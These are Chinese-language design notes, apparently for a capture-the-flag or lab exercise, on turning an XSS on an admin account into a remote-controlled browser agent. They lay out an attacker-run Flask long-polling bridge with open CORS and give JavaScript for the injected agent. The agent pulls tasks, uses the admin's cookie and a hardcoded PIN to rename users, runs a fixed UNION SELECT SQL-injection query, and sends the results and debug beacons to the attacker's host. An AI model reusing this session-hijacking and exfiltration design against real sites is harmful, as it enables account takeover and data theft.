思路：
- 唯一使用 admin 权限的操作为修改用户名，而 alice 拥有 admin 权限，且可被 XSS
    - 仅在 XSS 中改名，或将查询也放入 XSS中
- 此处在 XSS 中改名并查询，将新名字确认以及查询结果传回python，其余代码无需修改
    - 一次仅一个改名任务
- 通信结构为 
    - hacker 主控脚本
    - hacker Flask桥接服务器 
    - XSS 浏览器代理
- hacker Flask桥接服务器，单任务、长轮询的桥接服务器（被动接收连接并返回内容）
    任务使用独特序列号
    - 设计，单任务并发模型，新任务将覆盖旧任务
        ```py
        app.run(host=, port=, threaded=True)
        ```
        - 全局共享状态
            ```py
            from threading import Condition

            current_task = None     # 待执行任务
            current_result = None   # 已完成结果
            cv = Condition()        # 线程同步（锁/阻塞/唤醒）
            ```
        - 跨域头部  
            - 跨域触发 CORS 预检 `OPTIONS` 方法，应当放行 
            - 非默认内容类型的请求，如 JSON 需设置 `Content-Type` 头部
            ```py
            @app.after_request
            def add_cors_headers(resp):
                resp.headers["Access-Control-Allow-Origin"] = "*"
                resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
                resp.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS, HEAD"
                return resp            
            ```
    - 主控脚本接口
        - 主控->桥接，主控发布查询任务 `POST /api/send_task`。
            ```py
            with cv:
                current_task = data
                current_result = None
                cv.notify_all()
            ```
            - 逻辑
                - 主控发布新任务，同时覆盖旧任务
                - 清空旧结果，确保主控等待当前任务的新结果
                - 唤醒，若XSS阻塞等待新任务

            - 修改名称，使用 JSON 格式（python字典转JSON）
                - seq
                - url_old_name
                - new_name
                - admin_pin 固定l1编码字符串，硬编码到初始XSS
            - 查询数据库，均为固定字符串，硬编码到初始XSS
                - 查询URL
                - 载荷 固定的 UNION SELECT 字符串
                - 提取

        - 主控<-桥接 获取查询结果 `GET /api/get_result?seq=N`
            ```py
            cv.wait_for(lambda: current_result is not None and current_result.get("seq") == seq, timeout=timeout)
            ```
            - 概念
                - 主控接受指定seq结果
                - 若XSS代理还未提交则阻塞等待直到超时

            - seq
            - 超时。

    - XSS浏览器代理接口
        - XSS<-桥接 获取查询任务 `GET get_task?seq_next=N`
            ```py
            cv.wait_for(lambda: current_task is not None and seq_next == current_task.get("seq"), timeout=timeout)
            ```
            - 逻辑
                - XSS代理接受预期seq任务
                - 若主控还未发布则阻塞等待直到超时

            - seq_next 下一个任务编号，用于避免重复拿同一任务
        - XSS->桥接 发布查询结果 `POST send_result`
            ```py
            with cv:
                current_result = data
                cv.notify_all()
            ```
            - 逻辑
                - XSS代理发布结果
                - 唤醒，若主控阻塞等待新结果

            - seq
            - newname
            - enc_history_hex

- 主脚本修改
    - 将修改名称函数的内容替换为向hacker桥接服务器发布任务 `/api/send_task`
        - 修改URL到桥接服务器，字典添加seq字段，调整数据类型到JSON
    - 将查询数据库的代码移入XSS，并修改为从hacker服务器获取查询结果 `/api/get_result`
        - 修改URL到桥接服务器，请求参数添加seq字段，调整数据类型
        - 循环，若成功得到XSS的查询结果则seq+=1、解压JSON提取密文字段
- XSS构建
    - 概念
        - 从桥接服务器接受任务
        - 执行改名与查询
        - 将结果发布到桥接服务器
        - 此处使用持久连接不触发 ETag 刷新，从而无需使用浏览器本地储存，直接使用变量
        - admin 同源，自动携带 Cookie

    - 防止重复启动
        ```js
        if (window.__agent) return;
        window.__agent = true;
        ```
        使用自定义全局变量在“当前页面”防止重复启动，若页面刷新应当使用 localStorage 
        ```js
        const KEY = "__agent_running_v1";
        if (localStorage.getItem(KEY) === "1") return;
        localStorage.setItem(KEY, "1");
        ```
    
    - 将固定字符串放入 XSS 作为js代码常量
        - `json.dumps()` 自带引号
        - `encodeURIComponent()` 进行 URI 编码并设置对应内容类型头部

    - 接受任务 `GET /get_task?seq_next=N`
        ```js
        let seq_next = 1;

        async function getTask() {
            const r = await fetch(`${BRIDGE}/get_task?seq_next=${seq_next}`);
            if (r.status !== 200) return null;
            return r.json();
            }
        ```

    - 回传结果 `POST /send_result`
        ```js
        await fetch(`${BRIDGE}/send_result`, {
            method: "POST",
            headers: {"Content-Type":"application/json"},
            body: JSON.stringify({seq: t.seq, foo: bar}),
        });
        ```

    - 主循环
        ```js
        (async () => {
            for (;;) {
                const t = await getTask();
                if (!t) continue;

                await job_1(t);
                const res = await job_2();
                await sendResult(...);

                seq_next = t.seq + 1;
            }
        })();
        ```
    - 调试
        - 点错误
            - `new Image()`
                无需读响应、不受 CORS 影响、基本不会阻塞主逻辑。
                ```js
                function dbg(msg) {
                (new Image()).src = `${BRIDGE}/dbg?m=` + encodeURIComponent(msg);
                }
                ```
            - `navigator.sendBeacon`
                浏览器后台发送，适合高频；页面刷新/跳转时也更可能送达。
                ```js
                function dbg2(msg) {
                const data = new Blob([msg], {type: "text/plain"});
                navigator.sendBeacon(`${BRIDGE}/dbg2`, data);
                }            
                ```
        - 全局错误
            回传 `stack`
            ```js
            window.onerror = (msg, src, line, col, err) => {
            dbg(`onerror:${msg}@${line}:${col}`);
            };
            window.onunhandledrejection = (e) => {
            dbg(`unhandledrejection:${(e.reason && e.reason.stack) || e.reason || e}`);
            };
            ```
        - 上下文日志
            fetch的响应状态错误时，捕获文本并设置上下文、状态码、错误文本长度、错误文本切片，快速定位错误位置
            ```js
            async function mustOk(r, where) {
            if (!r.ok) {
                const t = await r.text().catch(()=>"<no text>");
                dbg(`${where}: status=${r.status} len=${t.length} head=${t.slice(0,200)}`);
                throw new Error(`${where} bad status`);
            }
            return r;
            }

            const r = await fetch(url);
            await mustOk(r, "queryEnc");
            const text = await r.text();
            ```